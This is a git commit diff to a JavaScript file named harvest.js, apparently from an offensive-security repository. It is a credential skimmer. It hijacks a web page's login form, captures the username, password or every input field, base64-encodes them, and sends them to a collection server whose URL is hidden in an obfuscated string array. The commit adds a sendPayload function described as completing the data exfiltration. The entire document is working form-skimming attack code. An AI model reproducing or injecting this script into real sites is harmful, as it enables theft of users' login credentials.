948a93c2d73168fa8ad42f7efcea1269ae4e6934
toneillcodes <148013535+toneillcodes@users.noreply.github.com>
2024-08-30 22:01:40 -0400

    Updated form name to use a variable and added sendPayload function to complete data exfiltration

--- harvest.js
+++ harvest.js
@@ -1,7 +1,9 @@
-siteId = "7e578ae5";
-formId = "93djokdi";
+var siteId = "7e578ae5";
+var formName = "loginform";
+var formId = "93djokdi";
 var enableEncoding = true;
 var _0x3745 = ["http","://","192.168.1.1",":8080/harvest?data="];
+
 
 $(document).ready(function() {
         console.log("initializing harvester...");
@@ -9,17 +11,18 @@ $(document).ready(function() {
 });
 
 function initHarvester() {
-	var loginForm = $('#loginform');
+	var loginForm = $('#' + formName);
 	if(loginForm) {
-		$('#loginform').append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
-		$('#loginform').append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
-		$('#loginform').append("<input type='submit' onClick='grabIt(); return false;'/>");
+		$('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
+		$('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
+		$('#' + formName).append("<input type='submit' onClick='grabIt(); return false;'/>");
 		console.log("locked and loaded");
 	} else {
 		console.log("ERROR: harvester failed to locate 'loginform', check your HTML");
 	}
 }
 
+/* parse a few specific fields from the form */
 function grabIt() {
 	var username = null;
 	username = $('#username').val();
@@ -34,7 +37,7 @@ function grabIt() {
 		if(enableEncoding)
 				payload = btoa(payload);
 		console.log("Captured credentials: " + payload);
-		$.get(_0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + payload);
+        sendPayload(payload);
 	} else {
 		console.log("No credentials were found");
 	}
@@ -43,17 +46,24 @@ function grabIt() {
 /* parse through the form elements and serialize anything interesting */
 function grabAll() {
         var payload = "";
-        for(var i = 0; i<loginform.elements.length; i++) {
+        for(var i = 0; i < loginform.elements.length; i++) {
                 console.log("element: " + loginform.elements.item(i));
                 if(loginform.elements.item(i) instanceof HTMLInputElement) {
                         console.log("name: " + loginform.elements.item(i).name);
                         console.log("value: " + loginform.elements.item(i).value);
-                        payload += "&" + loginform.elements.item(i).name + ":" + loginform.elements.item(i).value;
+						if(payload == "")
+							payload += loginform.elements.item(i).name + ":" + loginform.elements.item(i).value;
+						else
+							payload += "&" + loginform.elements.item(i).name + ":" + loginform.elements.item(i).value;
                 }
         }
         if(enableEncoding) {
                 payload = btoa(payload);
         }
         console.log("resulting payload = " + payload);
+        sendPayload(payload);
+}
+
+function sendPayload(payload) {
         $.get(_0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + payload);
 }
